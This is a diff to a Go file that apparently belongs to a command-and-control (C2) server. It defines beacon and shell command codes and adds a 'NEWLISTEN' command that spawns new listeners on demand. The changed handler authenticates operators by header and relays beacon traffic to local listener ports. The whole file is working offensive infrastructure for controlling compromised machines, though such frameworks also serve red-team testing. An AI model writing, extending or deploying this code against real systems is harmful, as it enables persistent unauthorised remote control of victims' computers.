@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/binary"
 	"encoding/xml"
 	"fmt"
 	"io/ioutil"
@@ -17,9 +18,10 @@ const (
 	BEACONS   = 0x00000001
 	SHELL     = 0x00000002
 	NEWBEACON = 0x00000003
+	NEWLISTEN = 0x00000004
 )
 
-func StartC2(uri string, port int, res *[]byte) {
+func StartC2(uri string, port uint16, res *[]byte) {
 	http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {
 		iamfrom := r.Header.Get("Iamfrom")
 		if iamfrom == "C2AUTH" {
@@ -40,33 +42,53 @@ func StartC2(uri string, port int, res *[]byte) {
 		}
 
 	})
-	fmt.Println("Server is running on : " + strconv.Itoa(port))
+	fmt.Println("Server is running on : " + strconv.Itoa(int(port)))
 	http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
 
 }
 
-func StartClient(uri string, port int) {
+func StartClient(uri string, port uint16) {
 	config, _ := parseConfig("./Client/config.xml")
 	var res []byte // dong tai jie shou 40049
-	go StartC2("c2", 50049, &res)
+	lis := 0
+	go StartC2("c2", port-1, &res)
 	http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {
 
-		username := r.Header.Get("Username")
-		password := r.Header.Get("Password")
+		username := r.Header.Get("user-name")
+		password := r.Header.Get("pass-word")
 
 		if authenticate(username, password, config) {
 			body, _ := ioutil.ReadAll(r.Body)
-
-			printkey(res)
-			if body == nil {
+			if len(body) == 0 {
 				w.WriteHeader(http.StatusOK)
+				w.Header().Set("Content-Type", "application/octet-stream")
 				w.Write(res)
 				res = make([]byte, 0)
 			} else {
-				Send_Bytes_to(w, body, "http://localhost:8080", expectedHeaders)
-				w.WriteHeader(http.StatusOK)
-				w.Write(res)
-				res = make([]byte, 0)
+				if Check_Command(body) == NEWLISTEN {
+					body = body[4:]
+					lisname := string(body[:4])
+					port2 := binary.BigEndian.Uint16(body[4:6])
+					uri2 := strconv.Itoa(int(port2))
+					a := body[6:]
+					go StartListener(uri2, port2, lisname, a)
+					lis++
+				} else if lis == 0 {
+					println("lis 00000")
+					w.WriteHeader(http.StatusOK)
+					w.Header().Set("Content-Type", "application/octet-stream")
+					w.Write(res)
+					res = make([]byte, 0)
+				} else {
+					listen_port := binary.BigEndian.Uint16(body[:2])
+					body = body[2:]
+					Send_Bytes_to(w, body, "http://localhost:"+strconv.Itoa(int(listen_port))+"/"+strconv.Itoa(int(listen_port)), expectedHeaders)
+					w.WriteHeader(http.StatusOK)
+					w.Header().Set("Content-Type", "application/octet-stream")
+					w.Write(res)
+					res = make([]byte, 0)
+				}
+
 			}
 
 		} else {
@@ -76,7 +98,7 @@ func StartClient(uri string, port int) {
 		}
 	})
 
-	fmt.Println("Server is running on : " + strconv.Itoa(port))
+	fmt.Println("Server is running on : " + strconv.Itoa(int(port)))
 	http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
 }
 
